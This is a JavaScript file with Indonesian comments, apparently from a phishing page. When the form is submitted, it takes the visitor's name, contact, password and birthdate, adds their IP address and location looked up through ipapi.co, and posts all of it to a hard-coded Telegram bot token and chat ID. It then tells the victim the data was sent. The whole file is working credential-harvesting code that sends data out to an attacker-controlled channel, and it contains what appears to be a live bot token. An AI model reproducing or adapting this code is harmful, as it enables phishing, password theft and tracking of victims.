// Konfigurasi API Bot Telegram
const botToken = '7883195342:AAHFVsKhUbxrEqtBdq3jlZJpn9w7FEll2ak'; // Ganti dengan token bot Telegram Anda
const chatId = '6936723956'; // Ganti dengan ID chat Telegram Anda

let ipInfo = 'IP tidak tersedia'; // Variabel untuk menyimpan IP

// Fungsi untuk mengirim data ke Telegram
document.getElementById('dataForm').addEventListener('submit', function (e) {
  e.preventDefault();

  const name = document.getElementById('name').value;
  const contact = document.getElementById('contact').value;
  const password = document.getElementById('password').value;
  const birthdate = document.getElementById('birthdate').value;

  const message = `Data Baru:\nNama: ${name}\nKontak: ${contact}\nKata Sandi: ${password}\nTanggal Lahir: ${birthdate}\n${ipInfo}`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => response.json())
    .then(() => {
      alert('Data berhasil dikirim!');
      document.getElementById('dataForm').reset();
    })
    .catch(() => {
      alert('Terjadi kesalahan saat mengirim data.');
    });
});

// Mendapatkan data IP dan lokasi menggunakan ipapi
fetch('https://ipapi.co/json/')
  .then((response) => {
    if (!response.ok) {
      throw new Error('Gagal mendapatkan data IP.');
    }
    return response.json();
  })
  .then((data) => {
    ipInfo = `Alamat IP Anda: ${data.ip} (Lokasi: ${data.city}, ${data.country_name})`;
    console.log(ipInfo); // Untuk debug di console
  })
  .catch((error) => {
    console.error('Error:', error);
  });